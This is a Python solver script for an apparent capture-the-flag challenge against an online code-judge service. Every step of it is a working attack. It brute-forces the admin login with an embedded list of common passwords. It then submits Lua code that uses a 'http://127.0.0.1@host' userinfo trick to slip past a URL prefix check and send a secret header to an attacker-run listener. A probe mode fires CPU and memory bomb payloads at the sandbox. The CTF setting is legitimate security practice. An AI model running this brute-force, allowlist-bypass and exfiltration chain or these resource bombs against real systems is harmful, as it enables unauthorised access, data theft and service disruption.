#!/usr/bin/env python3
"""Спорный вердикт solver — rockyou-top brute, login, Lua fetch userinfo bypass.

Abuse chain:
  1. Dictionary-brute the admin login with an embedded rockyou top slice
     (the deployment default password sits inside it).
  2. Submit a Lua solution that calls
     fetch("http://127.0.0.1@<callback-host>:<port>/pwned") — check_url only
     requires the URL to start with http://127.0.0.1, and the userinfo
     syntax sends the request to <callback-host> instead.
  3. The outgoing request carries the X-Flag header; the local listener
     captures it.

Stdlib only.
    python3 solve.py [--url http://127.0.0.1:13437] [--callback host.docker.internal] \
                     [--expect '<flag>']
    python3 solve.py --url http://127.0.0.1:8080 --probe
                     # adversarial posture: every CPU/memory bomb below must
                     # die in <5s while the legit sample still passes

Stand (platform edge + per-instance cookie + callback via the host's
docker gateway — the listener runs on the stand host, not here):
    python3 solve.py --url https://<inst>.ctf.hackforces.com \
        --cookie 'jury_instance=<id>' --delay 0.35 \
        --callback <docker-gateway-ip> --listen-port 19999 --remote-listener
"""
import argparse
import http.cookiejar
import sys
import threading
import time
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# Classic rockyou top slice (public knowledge); the deployment default
# password is a member of this list.
ROCKYOU_TOP = [
    "123456", "12345", "123456789", "password", "iloveyou", "princess",
    "12345678", "qwerty", "abc123", "monkey", "letmein", "dragon",
    "111111", "baseball", "iloveu", "trustno1", "sunshine", "master",
    "freedom", "whatever", "qaazwsx", "password1", "rockyou", "1234567890",
    "654321", "superman", "football", "batman", "starwars", "michael",
    "shadow", "jennifer", "jordan", "harley", "ranger", "hunter",
    "buster", "soccer", "hockey", "killer", "george", "sexy", "andrew",
    "charlie", "thomas", "robert", "access", "love", "summer", "ashley",
    "bailey", "passw0rd", "matrix", "purple", "angel", "orange",
    "ginger", "phoenix", "willow", "thunder",
]

captured = {}


class _Callback(BaseHTTPRequestHandler):
    def do_GET(self):
        captured["x-flag"] = self.headers.get("X-Flag")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *args):
        pass


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None  # surface 302 so the brute loop can see success


def post(opener, url, data, timeout=10):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    try:
        resp = opener.open(req, timeout=timeout)
        return resp.status, resp.url, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read().decode(errors="replace")


def brute_login(opener, base, login, delay=0.0):
    """Dictionary brute of the login form (302 == success)."""
    for cand in ROCKYOU_TOP:
        status, url, body = post(opener, base + "/login",
                                 {"login": login, "password": cand})
        if status in (301, 302):
            return cand
        if delay:
            time.sleep(delay)  # platform edge drops bursts
    return None


def seed_cookies(jar, host, header):
    """Seed static cookies (e.g. jury_instance) into the jar.

    Not a request header: the cookie processor would skip its own session
    cookies when a static Cookie header is present, breaking the panel.
    """
    for part in header.split(";"):
        name, _, value = part.strip().partition("=")
        if name and value:
            jar.set_cookie(http.cookiejar.Cookie(
                version=0, name=name, value=value, port=None,
                port_specified=False, domain=host, domain_specified=False,
                domain_initial_dot=False, path="/", path_specified=True,
                secure=False, expires=None, discard=True, comment=None,
                comment_url=None, rest={}))


# Each entry: (name, lua payload, must_be_accepted). Every case must come
# back with a rendered verdict page in <5s; bombs must NOT be accepted,
# the legit sample must be.
PROBE_CASES = [
    ("spin", "while true do end", False),
    ("pcall-spin",
     "while true do pcall(function() while true do end end) end", False),
    ("coroutine-spin",
     "local co = coroutine.wrap(function() while true do end end) co()", False),
    # fresh coroutines that stay just under a fixed instruction threshold
    # would never trip a count hook — CPU time has no such blind spot
    ("under-radar-coroutines",
     "while true do\n"
     "  local co = coroutine.wrap(function() for i = 1, 19000000 do end end)\n"
     "  pcall(co)\n"
     "end", False),
    # one line per 10 MB memcpy: instruction counts barely move, CPU does
    ("c-heavy-loop", 'while true do ("x"):rep(10000000) end', False),
    ("memory-bomb", 'print(("x"):rep(2^31))', False),
    ("legit-sample",
     'local d1 = tonumber(fetch("http://127.0.0.1:8080/system/data1"))\n'
     'local d2 = tonumber(fetch("http://127.0.0.1:8080/system/data2"))\n'
     'fetch("http://127.0.0.1:8080/system/out", "POST", tostring((d1 + d2) / 2))',
     True),
]


def probe(base, login, delay=0.0, cookie=None):
    jar = http.cookiejar.CookieJar()
    if cookie:
        seed_cookies(jar, urllib.parse.urlparse(base).hostname, cookie)
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar), _NoRedirect)

    password = brute_login(opener, base, login, delay=delay)
    if password is None:
        print("[-] probe: brute failed", file=sys.stderr)
        return 1

    failures = 0
    for name, code, want_accepted in PROBE_CASES:
        t0 = time.monotonic()
        try:
            status, _url, body = post(opener, base + "/", {"code": code},
                                      timeout=8)
            elapsed = time.monotonic() - t0
        except Exception as exc:  # client timeout / reset = dead case
            status, body, elapsed = None, str(exc), float("inf")
        accepted = ">Accepted</span>" in body if status == 200 else False
        passed = (status == 200 and elapsed < 5.0
                  and accepted == want_accepted)
        failures += 0 if passed else 1
        print(f"[{'+' if passed else '-'}] probe {name}: "
              f"status={status} elapsed={elapsed:.2f}s accepted={accepted}")

    alive = False
    try:
        with urllib.request.urlopen(base + "/login", timeout=5) as resp:
            alive = resp.status == 200
    except Exception:
        alive = False
    print(f"[{'+' if alive else '-'}] probe service-alive: /login -> {alive}")
    if not alive:
        failures += 1
    if failures:
        print(f"[-] probe: {failures} case(s) failed", file=sys.stderr)
        return 1
    print("[+] probe: all cases passed")
    return 0


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://127.0.0.1:13437")
    ap.add_argument("--login", default="admin")
    ap.add_argument("--callback", default="host.docker.internal",
                    help="host the container resolves to reach this machine")
    ap.add_argument("--expect", default=None, help="flag to assert at the end")
    ap.add_argument("--cookie", default=None,
                    help="static cookies for the platform edge, "
                         "e.g. 'jury_instance=<id>'")
    ap.add_argument("--listen-port", type=int, default=0,
                    help="fixed port for the local callback listener")
    ap.add_argument("--delay", type=float, default=0.0,
                    help="pause between brute requests (edge pacing)")
    ap.add_argument("--remote-listener", action="store_true",
                    help="callback lands on an external listener; "
                         "skip local binding and the capture wait")
    ap.add_argument("--probe", action="store_true",
                    help="run the adversarial posture suite instead of solving")
    args = ap.parse_args()
    base = args.url.rstrip("/")

    jar = http.cookiejar.CookieJar()
    if args.cookie:
        seed_cookies(jar, urllib.parse.urlparse(base).hostname, args.cookie)
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar), _NoRedirect)

    if args.probe:
        return probe(base, args.login, delay=args.delay, cookie=args.cookie)

    if args.remote_listener:
        port = args.listen_port
        print(f"[*] remote listener mode: expect the callback on "
              f"{args.callback}:{port}")
    else:
        server = ThreadingHTTPServer(("0.0.0.0", args.listen_port), _Callback)
        port = server.server_address[1]
        threading.Thread(target=server.serve_forever, daemon=True).start()
        print(f"[*] callback listener on 0.0.0.0:{port}")

    # 1) Dictionary brute of the login form (302 == success).
    password = brute_login(opener, base, args.login, delay=args.delay)
    if password is None:
        print("[-] brute failed: password outside embedded rockyou slice",
              file=sys.stderr)
        return 1
    print(f"[+] password found: {password!r}")

    # 2) Lua fetch with the userinfo bypass; the outgoing request carries X-Flag.
    # 0/443 -> https без суффикса порта; 80 -> http без суффикса; иначе :port.
    if args.listen_port in (0, 443):
        lua = f'fetch("https://127.0.0.1@{args.callback}/pwned")'
    elif args.listen_port == 80:
        lua = f'fetch("http://127.0.0.1@{args.callback}/pwned")'
    else:
        lua = f'fetch("http://127.0.0.1@{args.callback}:{args.listen_port}/pwned")'
    status, url, body = post(opener, base + "/", {"code": lua})
    if status != 200:
        print(f"[-] submit failed: {status} {body[:200]}", file=sys.stderr)
        return 1
    print(f"[*] solution submitted, verdict page {len(body)} bytes")

    if args.remote_listener:
        print("[*] done — read the flag off the external listener (X-Flag)")
        return 0

    # 3) Wait for the callback.
    deadline = time.time() + 15
    while time.time() < deadline and "x-flag" not in captured:
        time.sleep(0.2)
    server.shutdown()
    flag = captured.get("x-flag")
    if not flag:
        print("[-] no X-Flag captured", file=sys.stderr)
        return 1
    print("[+] FLAG:", flag)
    if args.expect is not None and flag != args.expect:
        print(f"[-] flag mismatch: expected {args.expect!r}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
